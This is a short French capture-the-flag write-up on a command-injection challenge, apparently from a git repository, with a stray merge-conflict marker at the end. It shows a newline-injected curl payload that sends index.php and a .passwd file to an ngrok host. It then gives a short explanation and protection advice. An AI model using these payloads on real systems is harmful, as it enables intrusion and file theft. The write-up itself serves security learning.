# Injection de commande

Dans cette exercice nous avons juste un input

On peut juste jouer avec une ip

L'input semble filter sur certains caractères tel que ; & | $

Cependant on peut avoir le contenu du fichier en changeant le body de la requete pour

```
ip=127.0.0.1+%0A+curl+--data+"@index.php"+https://f3a91ce52ab5.ngrok-free.app/
```

Maintenant avec ngrok on peut voir toutes les requetes sur `loclahost:4040`

![Body](img/7-file.png"Title")

Apres analyse du body à droite en peut refaire la requete avec le bon fichier

```
ip=127.0.0.1+%0A+curl+--data+"@.passwd"+https://f3a91ce52ab5.ngrok-free.app/
```

![Solution](img/7-result.png"Title")


On a donc le code

## Explication

Ici `%0A` est le code url pour un saut de ligne, ce qui permet de casser la commande initiale et d'en lancer une nouvelle.
Ensuite on utilise curl pour envoyer le contenu du fichier voulu vers notre serveur ngrok.

## Protection

Pour se protéger contre ce type d'attaque, il est important de valider et de nettoyer toutes les entrées utilisateur.
Utiliser `url_decode` avant `str_replace` et y rajouter "\n"	dans les caractères à filtrer.
>>>>>>> d9d08f9 (Add challenge 7)
